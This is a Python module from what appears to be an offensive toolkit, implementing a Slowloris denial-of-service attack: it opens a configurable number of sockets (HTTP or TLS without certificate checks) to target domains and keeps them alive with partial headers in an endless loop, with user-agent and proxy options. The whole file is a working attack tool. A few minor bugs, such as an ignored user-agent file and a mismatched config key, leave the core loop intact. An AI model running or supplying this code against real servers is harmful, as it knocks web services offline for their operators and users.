'''
Acknowledgement:

'''

import socket
import time
import os
import ssl
from random import randint

from lib.cmd_tool import *

NAME = 'Slowloris'

def send_line(self, line):
    line = f'{line}\r\n'
    self.send(line.encode('utf-8'))

def send_header(self, name, value):
    self.send_line(f'{name}: {value}')

class Module:
    def __init__(self):
        self.config = {
            'Domain': {
                'value': '',
                'help': 'Target domains',
            },
            'Port': {
                'value': '80',
                'help': 'Domain web service port.',
            },
            'DomainFile': {
                'value': '',
                'help': 'URL file.',
            },
            'HTTPS': {
                'value': '0',
                'help': 'Enable HTTPS, 0: false, 1: true'
            },
            'Count': {
                'value': '150',
                'help': 'Socket count.',
            },
            'Timeout': {
                'value': '20',
                'help': 'Socket timeout.',
            },
            'Interval': {
                'value': '5',
                'help': 'Check socket for every specified seconds.',
            },
            'DefaultUA': {
                'value': DEFAULT_UA,
                'help': 'Default User-Agent',
            },
            'UAfile': {
                'value': '',
                'help': 'File path of multiple User-Agent.'
            },
            'DefaultProxy': {
                'value': '',
                'help': '',
            },
            'ProxyFile': {
                'value': '',
                'help': '',
            },
            'Mode': {
                'value': '0',
                'help': 'Slowloris mode.',
                'option': {
                    TARGET_SPECIFIED: 'Do slowloris to specified targets.',
                    TARGET_FILE: 'Obtain targets from specified file.'
                }
            }
        }

        self.help = ''
        self.lsSocket = []

        setattr(socket.socket, 'send_line', send_line)
        setattr(socket.socket, 'send_header', send_header)

    '''
    Validate config.
    '''
    def validate(self):
        szURLs = get_value(self.config, 'Domain')
        szPort = get_value(self.config, 'Port')
        szUrlFile = get_value(self.config, 'UrlFile')
        szCount = get_value(self.config, 'Count')
        szTimeout = get_value(self.config, 'Timeout')
        szUaFile = get_value(self.config, 'UAfile')
        szProxyFile = get_value(self.config, 'ProxyFile')

        nOptionIdx = get_optionIdx(self.config, 'Mode')

        if nOptionIdx == TARGET_SPECIFIED and not szURLs:
            cp.pf_failed('"URLs" cannot be null or empty.')
            return False
        
        if nOptionIdx == TARGET_FILE and not os.path.exists(szUrlFile):
            cp.pf_failed('Cannot find file: ' + szUrlFile)
            return False
        
        if not szPort or not szPort.isdigit():
            cp.pf_failed('Invalid port.')
            return False
        
        if not szCount or not szCount.isdigit() or int(szCount) <= 0:
            cp.pf_failed('Invalid count.')
            return False
        
        if not szTimeout or not szTimeout.isdigit() or int(szTimeout) <= 0:
            cp.pf_failed('Invalid timeout.')
            return False
        
        if szUaFile and not os.path.exists(szUaFile):
            cp.pf_failed('Path not exists: ' + szUaFile)
            return False
        
        if szProxyFile and not os.path.exists(szProxyFile):
            cp.pf_failed('Path not exists: ' + szProxyFile)

        return True
    
    '''
    User-Agent
    '''
    def get_szUA(self) -> str:
        uaFile = get_value(self.config, 'UAfile')
        szUA = None

        if uaFile:
            if os.path.exists(uaFile):
                with open(uaFile, 'r') as f:
                    lsUA = f.readlines()
                    szUA = lsUA[randint(0, len(lsUA) - 1)]

        if not szUA:
            szUA = get_value(self.config, 'DefaultUA')

        return get_value(self.config, 'DefaultUA')

    '''
    Interactive module.
    '''
    def interactive(self):
        interactive(self, 'slowloris')

    '''
    Initize socket for slowloris
    '''
    def init_socket(self, ip: str, port: int, nTimeout: int):
        bHTTPS = get_value(self.config, 'HTTPS') == '1'

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(nTimeout)

        if bHTTPS:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            sock = ctx.wrap_socket(sock, server_hostname=ip)
        
        sock.connect((ip, port))
        
        sock.send_line(f'GET /?{randInt()} HTTP/1.1')
        
        sock.send_header('User-Agent', self.get_szUA())
        sock.send_header('Accept-language', 'en-US,en,q=0.5')

        return sock

    '''
    Do slowloris
    '''
    def slowloris(self, ip: str, port: int, nTimeout: int, nCnt: int):
        try:
            cp.pf_info('Sending keey-alive headers')
            cp.pf_info(f'Socket count: {len(self.lsSocket)}')
            for sock in self.lsSocket:
                try:
                    sock.send_header('X-a', randint(1, 5000))
                except socket.error:
                    self.lsSocket.remove(sock)
            
            diff = nCnt - len(self.lsSocket)
            if diff <= 0:
                return
            
            cp.pf_info(f'Creating {diff} new sockets')
            for _ in range(diff):
                try:
                    sock = self.init_socket(ip, port, nTimeout)
                except socket.error as ex:
                    cp.pf_failed(str(ex))
                    break
                    
                self.lsSocket.append(sock)

        except Exception as ex:
            cp.pf_failed(str(ex))

    def get_lsDomain(self):
        return str2strls(get_value(self.config, 'Domain'))

    def get_proxy(self):
        pass

    def run(self):
        szIP = socket.gethostbyname(get_value(self.config, 'Domain'))
        nPort = int(get_value(self.config, 'Port'))
        nTimeout = int(get_value(self.config, 'Timeout'))
        nCnt = int(get_value(self.config, 'Count'))
        nInterval = int(get_value(self.config, 'Interval'))

        while True:
            try:
                self.slowloris(szIP, nPort, nTimeout, nCnt)
            except (KeyboardInterrupt, SystemExit):
                cp.pf_info('Stopping slowloris')
                break
            except Exception as ex:
                cp.pf_failed(str(ex))
            
            time.sleep(nInterval)